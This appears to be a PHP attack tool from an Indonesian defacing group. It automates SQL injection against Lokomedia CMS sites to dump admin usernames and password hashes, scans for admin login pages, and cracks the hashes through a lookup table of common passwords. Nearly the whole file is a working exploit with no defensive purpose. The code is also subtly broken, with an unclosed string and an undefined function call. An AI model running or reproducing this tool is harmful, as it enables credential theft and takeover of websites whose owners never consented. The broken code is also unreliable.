<?php
set_time_limit(0);
error_reporting(0);
// Lokomedia (SQL Injection) + Auto Scan Admin Login
// enjoyyyy
// Coded by Mr. Error 404 (l0c4lh34rtz) - IndoXploit - Sanjungan Jiwa
// greetz: res7ock crew - j*ncok Sec

//HARAP TIDAK MENGGANTI COPYRIGHT JIKA KALIAN INGIN DIHARGAI ^^

function cover() {
    echo "[==============================================]<br>";
    echo " <font color=blue>--> Lokomedia & Auto Scan Admin Login <--</color><br>";
    echo "     -->Thank To IndoXploit Coder Team <--<br>";
    echo "         _< Recoder By : 4YoUheaRt >_ <br>";
    echo "[==============================================]<br><br>";
}

?>
<html>
<head>
<style> body { background-image:url("https://i.gifer.com/eh.gif"); background-repeat: no-repeat; background-size: 100% 100%; }a{ color:Orangered; text-bold:1px 1px purple; text-decoration:none; } a:hover{ text-decoration:none; color:white; text-shadow:1px 1px maroon; } </style>
<style type="text/css">
.classname {
	-moz-box-shadow:inset 0px 1px 0px 0px #ff0000;
	-webkit-box-shadow:inset 0px 1px 0px 0px #ff0000;
	box-shadow:inset 0px 1px 0px 0px #ff0000;
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #f0f0f0), color-stop(1, #fcfcfc) );
	background:-moz-linear-gradient( center top, #f0f0f0 5%, #fcfcfc 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#f0f0f0", endColorstr="#fcfcfc");
	background-color:#f0f0f0;
	-webkit-border-top-left-radius:0px;
	-moz-border-radius-topleft:0px;
	border-top-left-radius:0px;
	-webkit-border-top-right-radius:0px;
	-moz-border-radius-topright:0px;
	border-top-right-radius:0px;
	-webkit-border-bottom-right-radius:0px;
	-moz-border-radius-bottomright:0px;
	border-bottom-right-radius:0px;
	-webkit-border-bottom-left-radius:0px;
	-moz-border-radius-bottomleft:0px;
	border-bottom-left-radius:0px;
	text-indent:0;
	border:1px solid #ff1212;
	display:inline-block;
	color:#000000;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	font-style:normal;
	height:40px;
	line-height:40px;
	width:290px;
	text-decoration:none;
	text-align:center;
	text-shadow:1px 1px 0px #ffffff;
}
.classname:hover {
	background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #fcfcfc), color-stop(1, #f0f0f0) );
	background:-moz-linear-gradient( center top, #fcfcfc 5%, #f0f0f0 100% );
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr="#fcfcfc", endColorstr="#f0f0f0");
	background-color:#fcfcfc;
}.classname:active {
	position:relative;
	top:1px;
}</style>
</head>
<center>
<?php cover(); ?>
<form method="post">
<textarea name="target" placeholder="http://www.targetlu.com/" style="width: 500px; height: 250px;" required></textarea><br>
<input type="submit" name="go" value="Xploit" style="width: 500px;">
</form>
</center>
<?php
function ngcurl($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
$admin = array(
'adm/',
'_adm_/',
'_admin_/',
'_administrator_/',
'operator/',
'sika/',
'develop/',
'ketua/',
'redaktur/',
'admin1/',
'admin2',
'admin3',
'admin4',
'admin5/',
'admin6',
'admin7',
'admin8',
'admin9',
'admin10',
'author',
'admin/',
'administrator/',
'adminweb/',
'user/',
'users/',
'dinkesadmin/',
'retel/',
'author/',
'panel/',
'paneladmin/',
'panellogin/',
'redaksi/',
'cp-admin/',
'master/',
'master/index.php',
'master/login.php',
'operator/index.php',
'sika/index.php',
'develop/index.php',
'ketua/index.php',
'redaktur/index.php',
'admin/index.php',
'administrator/index.php',
'adminweb/index.php',
'user/index.php',
'users/index.php',
'dinkesadmin/index.php',
'retel/index.php',
'author/index.php',
'panel/index.php',
'paneladmin/index.php',
'panellogin/index.php',
'redaksi/index.php',
'cp-admin/index.php',
'operator/login.php',
'sika/login.php',
'develop/login.php',
'ketua/login.php',
'redaktur/login.php',
'admin/login.php',
'administrator/login.php',
'adminweb/login.php',
'user/login.php',
'users/login.php',
'dinkesadmin/login.php',
'retel/login.php',
'author/login.php',
'panel/login.php',
'paneladmin/login.php',
'panellogin/login.php',
'redaksi/login.php',
'cp-admin/login.php',
'terasadmin/',
'terasadmin/index.php',
'terasadmin/login.php',
'rahasia/',
'rahasia/index.php',
'rahasia/admin.php',
'rahasia/login.php',
'dinkesadmin/',
'dinkesadmin/login.php',
'adminpmb/',
'adminpmb/index.php',
'adminpmb/login.php',
'system/',
'system/index.php',
'system/login.php',
'webadmin/',
'webadmin/index.php',
'webadmin/login.php',
'wpanel/',
'wpanel/index.php',
'wpanel/login.php',
'adminpanel/index.php',
'adminpanel/',
'adminpanel/login.php',
'adminkec/',
'adminkec/index.php',
'adminkec/login.php',
'admindesa/',
'admindesa/index.php',
'admindesa/login.php',
'adminkota/',
'adminkota/index.php',
'adminkota/login.php',
'admin123/',
'admin123/index.php',
'admin123/login.php',
'logout/',
'logout/index.php',
'logout/login.php',
'logout/admin.php',
'adminweb_setting',
'login/index.php',
'login/admin.php',
'padmin/',
'padmin/login.php',
'logout/index.php',
'administrasi/',
'administrasi/admin.php',
'administrasi/login.php',
'administrasi/index.php',
'administrasion/',
'administrasion/admin.php',
'administrasion/login.php',
'administrasion/index.php',
'admini/',
'admini/admin.php',
'admini/login.php',
'admini/index.php',
'adminbaru/',
'adminbaru/admin.php',
'adminbaru/login.php',
'adminbaru/index.php',
'newadmin/',
'newadmin/admin.php',
'newadmin/login.php',
'newadmin/index.php',
'keadmin/',
'keadmin/admin.php',
'keadmin/login.php',
'keadmin/index.php',
'siswaadmin/',
'siswaadmin/admin.php',
'siswaadmin/login.php',
'siswaadmin/index.php',
'siswadmin/',
'siswadmin/admin.php',
'siswadmin/login.php',
'siswadmin/index.php',
);
$real_pass = array(
"a66abb5684c45962d887564f08346e8d" => "admin123456",
"99026ab4ab3de96f3d7ae33c8c85057b" => "master!@#$qwe",
"c630643500720b255abb22e2ab2c31f6" => "sumedang123",
"1c63129ae9db9c60c3e8aa94d3e00495" => "1qaz2wsx", 
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"93261ae77f0df5522dd9767203f3aa17" => "house69",
"f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
"37c77ada62ec68d1b740717fc886bef6" => "Suk4bum1",
"d39b59b946b414c4e5926f9c7b23840a" => "kasitaugakya",
"fbff29af096fa646757ce8439b644714" => "vro190588",
"1feadc10e93f2b64c65868132f1e72d3" => "agoes",
"0192023a7bbd73250516f069df18b500" => "admin123",
"7aa1dfee8619ac8f282e296d83eb55ff" => "meong",
"24fa5ee2c1285e115dd6b5fe1c25a333" => "773062",
"d557fd4686821b5d8b927cdfe6e67d21" => "#admin#",
"5fec4ba8376f207d1ff2f0cac0882b01" => "admin!@#",
"a01726b559eeeb5fc287bf0098a22f6c" => "@dm1n",
"73acd9a5972130b75066c82595a1fae3" => "ADMIN",
"511f2efed0e465e700a951f2f1ecec19" => "bs1unt46",
"7b7bc2512ee1fedcd76bdc68926d4f7b" => "Administrator",
"99fedb09f0f5da90e577784e5f9fdc23" => "ADMINISTRATOR",
"e58bfd635502ea963e1d52487ac2edfa" => "!@#123!@#123",
"5449ccea16d1cc73990727cd835e45b5" => "ngadimin",
"c21f969b5f03d33d43e04f8f136e7682" => "default",
"1a1dc91c907325c69271ddf0c944bc72" => "pass",
"fffdf0489f264598e9d35cba0381e9ac" => "sukmapts",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"5ebe2294ecd0e0f08eab7690d2a6ee69" => "secret",
"c893bad68927b457dbed39460e6afd62" => "prueba",
"b2ca9cfa6067282a031d28a54886822d" => "admin4343",
"3a3795bb61d5377545b4f345ff223e3d" => "bingo",
"e172dd95f4feb21412a692e73929961e" => "bismillah",
"8221303fbf816fd9da96be7dd4c92f99" => "salawarhandap123",
"0570e3795fbe97ddd3ce53be141d1aed" => "indoxploit",
"098f6bcd4621d373cade4e832627b4f6" => "test",   
"976adc43eaf39b180d9f2c624a1712cd" => "adminppcp",
"5985609a2dc01098797c94a43e0a1115" => "masarief",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"1870a829d9bc69abf500eca6f00241fe" => "wordpress",
"126ac9f6149081eb0e97c2e939eaad52" => "blog",
"fe01ce2a7fbac8fafaed7c982a04e229" => "demo",
"04e484000489dd3b3fb25f9aa65305c6" => "redaksi2016",
"91f5167c34c400758115c2a6826ec2e3" => "administrador",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"c93ccd78b2076528346216b3b2f701e6" => "admin1234",
"912ec803b2ce49e4a541068d495ab570" => "asdf",
"1adbb3178591fd5bb0c248518f39bf6d" => "asdf1234",
"e99a18c428cb38d5f260853678922e03" => "abc123",
"a152e841783914146e4bcd4f39100686" => "asdfgh",
"a384b6463fc216a5f8ecb6670f86456a" => "qwert",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"b59c67bf196a4758191e42f76670ceba" => "1111",
"96e79218965eb72c92a549dd5a330112" => "111111",
"4297f44b13955235245b2497399d7a93" => "123123",
"c33367701511b4f6020ec61ded352059" => "654321",
"81dc9bdb52d04dc20036dbd8313ed055" => "1234",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"25f9e794323b453885f5181f1b624d0b" => "123456789",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"befe9f8a14346e3e52c762f333395796" => "qawsed",
"76419c58730d9f35de7ac538c2fd6737" => "qazwsx",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"bed128365216c019988915ed3add75fb" => "passw0rd",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"e10adc3949ba59abbe56e057f20f883e" => "123456",
"5f4dcc3b5aa765d61d8327deb882cf99" => "password",
"25d55ad283aa400af464c76d713c07ad" => "12345678",
"f379eaf3c831b04de153469d1bec345e" => "666666",
"96e79218965eb72c92a549dd5a330112" => "111111",
"fcea920f7412b5da7be0cf42b8c93759" => "1234567",
"d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
"6f3cac6213ffceee27cc85414f458caa" => "siteadmin",
"200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
"63a9f0ea7bb98050796b649e85481845" => "root",
"4297f44b13955235245b2497399d7a93" => "123123",
"c8837b23ff8aaa8a2dde915473ce0991" => "123321",
"e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
"4ca7c5c27c2314eecc71f67501abb724" => "letmein123",
"cc03e747a6afbbcbf8be7668acfebee5" => "test123",
"62cc2d8b4bf2d8728120d052163a77df" => "demo123",
"32250170a0dca92d53ec9624f336ca24" => "pass123",
"46f94c8de14fb36680850768ff1b7f2a" => "123qwe",
"200820e3227815ed1756a6b531e7e0d2" => "qwe123",
"c33367701511b4f6020ec61ded352059" => "654321",
"f74a10e1d6b2f32a47b8bcb53dac5345" => "loveyou",
"172eee54aa664e9dd0536b063796e54e" => "adminadmin123",
"e924e336dcc4126334c852eb8fadd334" => "waskita1234",
"02631cc1d0cc5bda188566e90d0ae16c" => "rsamku2013",
"b69cbef044eac6fc514a2988e62c5b30" => "unlock08804",
"12e110a1b89da9b09a191f1f9b0a1398" => "nalaratih",
"f70d32432ff0a8984b5aadeb159f9db6" => "Much240316",
"a2fffa77aa0dde8cd4c416b5114eba21" => "gondola",
"2b45af95ce316ea4cffd2ce4093a2b83" => "w4nd3szaki",
"c5612a125d8613ddae79a6b36c8bee37" => "Reddevil#21",
"6e7fbe8e6147e2c430ce7e8ab883e533" => "R4nd0m?!",
"5136850b6c8f3ebc66122188347efda0" => "adminku",
"5214905fbe8d7f0bb0d0a328f08af3f0" => "adminpust4k4",
"acfc976c2d22e4a595a9ee6fc0d05f27" => "dikmen2016",
"dcdee606657b5f7d8b218badfeb22a90" => "masputradmin",
"ecb4208ee41389259a632d3a733c2786" => "741908",
"827ccb0eea8a706c4c34a16891f84e7b" => "12345",
"eeee80342778e7b497d507f89094b10d" => "master10",
"d29c0398602e6cf005f0dcb7a0443c7d" => "adminjalan",
"9062756924cf10763cc89cf2793a77ab" => "pass4@nd1",
"8b6bc5d8046c8466359d3ac43ce362ab" => "ganteng",
"528d06a172eb2d8fab4e93f33f3986a8" => "jasindolive",
"058fe7f85df1e992ef7bf948f1db7842" => "404J",
"abe1f4492f922a9111317ed7f7f8e723" => "bantarjati5",
"6a94a61372debb05d71c7a00922a1c21" => "manado1188",
"1c5632388251f3fe6f9ac35239f339d7" => "Radmin",
"9ce71dc20cdc7515da53e03813c1e7f6" => "extazy",
"21232f297a57a5a743894a0e4a801fc3" => "admin",
"f1a43be9dc949532824bcdfe62660fca" => "siswadmin",
"d829b843a6550a947e82f2f38ed6b7a7" => "123admin",
"c054e00490a51d49b82104bf5880e499" => "admen",
"23e1691cb0a5e42bd8236b4ea794bf0c" => "prd",
"5212cc59c1974e95124fef18b052ce4a" => "k3tu4",
"2ff462bc49e322708a48d3d5e3ca4bab" => "didik",
"5868f30f0a4c98cebb4d9c8a7578ed6d" => "12oktober2008",
"20beaf3b3ce9ae10dc8c880a877723dc" => "!@#admin",
"d89889b2fe5b592369484d3612f60a51" => "sditnurelqolam",
"17c4520f6cfd1ab53d8745e84681eb49" => "superadmin",
"dddcdaa8264e6d96baadd43f324fbd83" => "Superadmin",
"6f0665537dac1a6065346d5f689ac369" => "super@dmin",
"958f62f9f8b7f348d08943189fda3b15" => "gendeng",
"7577bfe4fecd40c43e6140344d90ce0e" => "sableng",
"4e5ad0dc4d478726661c8c2b3ea31777" => "sembung",
"dcdd932ea3418387ef2f06644303389e" => "sabdi",
"893002f27b61c6efad7c968a004f5f17" => "raharjo77",
"8c1fa65f68ed2c68fc963f76789eb6ae" => "wisanggeni",
"ee646309f43a2b1f867b8774c5fda63f" => "bumuna",
"46e109ecf6c11951b511b482275c812c" => "dinardirman",
"9c0dca4f70be88df704626363bd04f25" => "ipdi2019",
"8c819569b59c4c9824137fea81f6d0f3" => "adminlekok",
"33e6101b6a137acaef8411d6d81676a1" => "admin1234567891",
"8c0df7a207e85d2d3f1f288b4d87e1df" => "mesemindah",
"c27e2f241869a7fde7092d7e91452441" => "Veteran37",
"3c40ca62e2c2870237dd53dbf4c36379" => "cdf404",
"9bcc8539ffe61eaef5ac86ce26842fbf" => "morinagabmt",
"f5f1b50ab590f7629fb2beb1f0dc0b96" => "inside*5549",
"9a94a5312b93cfa5b63f3d9f4b553468" => "586267924",
"e06e0f37660716007da9e233f2a2da52" => "outreaching123",
"392eccf1371f3fa76e6de000a898a58d" => "ambarukmo2015",
"d66549c7d1bbf082c22012770aaec028" => "umitra2018",
"da6fa909f1c0188c539feb08d4496eb7" => "newton",
"2b2ca6fa6c3e27e1ae70ef071fa72e1b" => "ecoutez140107",
);
$sites = explode("\r\n", htmlspecialchars($_POST['target']));
if(isset($_POST['go'])) {
    foreach($sites as $url) {
        if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
            $url = "http://$url";
        } else {
            $url = $url;
        }
        $statis = "";
        $sisa = "";
        $login = "";
        $param_list = array("statis","kategori","berita","siswa","visi","misi","murid","sejarah","profil","galeri","ketua","dinas","guru","agenda","download","kerjasama","perhubunggan","sekolah","dokumen","pendidikan","prestasi","siswabaru","muridbaru","kepalasekolah","fakultas","kesehatan","bidang","wakil","buku","kerja","bantuan","web","dasar","kenanggan","kebijakan","seni","budaya","lomba","jasamurid","jasaguru","jasa","kepribadian","perkembanggan","kebudaya","perikanan","perternakan","hewan","taman","info","infosiswa","infomurid","infoguru","infoalumni","guru2019","guru2018","guru2017","guru2016","guru2015","berbahaya","2019","2018","2017","2016","2015","2014","2013","2012","2011","2010","2009","2008","2007","2006","mahasiswa","kekerasan","sedih","senyum","gembira","bahagia","tanda","bercerita);
        $curl = ngcurl($url);
        $curl = str_replace("'", '"', $curl);
        foreach($param_list as $param) {
            preg_match_all("/$param-(.*?)\">/", $curl, $id);
            foreach($id[1] as $stat) {
                $pecah = explode("-", $stat);
                $statis .= $pecah[0];
                $sisa .= $pecah[1];
                break;
            }
            foreach($admin as $adminweb) {
                $curl_admin = ngcurl("$url/$adminweb");
                if(preg_match("/administrator|username|password/i", $curl_admin) AND !preg_match("/not found|forbidden|404|403|500/i", $curl_admin)) {
                    $login .= "$url/$adminweb";
                    break;
                }
            }
            $sql = ngcurl("$url/$param-$statis'/*!50000UniON*/+/*!50000SeLeCT*/+/*!50000cOnCAt*/(0x696e646f78706c6f6974,0x3c6c693e,username,0x20,password,0x3c6c693e)+from+users--+---+-$sisa");
            preg_match("/<meta name=\"description\" content=\"(.*?)\">/", $sql, $up);
            preg_match("/<li>(.*)<li>/", $up[1], $akun);
            $data = explode(" ", $akun[1]);
            echo "[+] URL: $url\n";
            //echo "[+] param: $param\n";
            if(htmlspecialchars($curl) !== htmlspecialchars($sql)) {
                if(preg_match("/indoxploit/", $sql)) {
                    //echo "[ Injection Successfully ]\n";
                    if($data[0] == "" || $data[1] == "") {
                        echo "[+] Not Injected :(\n\n";
                        break;
                    } else {
                        echo "[+] username: ".$data[0]."\n";
                        $passwd = $real_pass[$data[1]];
                        if($passwd == "") {
                            $passwd = $data[1];
                            simpen($data[1]);
                        }
                        echo "[+] password: $passwd\n";
                    }
                    if($login == "") {
                        echo "[+] Login Admin ga ketemu :(\n\n";
                    } else {
                        echo "[+] Login: $login\n\n";
                    }
                    break;
                } else {
                    echo "[+] Not Injected :(\n\n";
                    break;
                }
            } else {
                echo "[+] Not Injected :(\n\n";
                break;
            }
        }
    }
}
?>
